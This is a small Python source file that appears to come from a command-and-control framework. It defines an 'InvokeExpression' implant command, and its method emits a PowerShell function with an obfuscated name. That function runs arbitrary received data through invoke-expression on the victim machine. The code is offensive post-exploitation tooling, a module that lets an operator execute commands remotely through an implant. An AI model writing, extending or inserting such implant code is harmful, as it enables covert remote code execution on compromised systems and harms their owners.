class InvokeExpression:
    # Module notes:
    #   IM should be renames to IE, after initial testing.
    type = "IM"
    args = "Module name"
    input = "exec_module"

    def process_implant_response(self):
        print("We're processing invoked expressions from loaded modules")

    def implant_text(self):
        var = '''
function {{ ron.obf_invoke_module }} ($data) {
    $Script:tr = invoke-expression "$data"
}'''
        return var
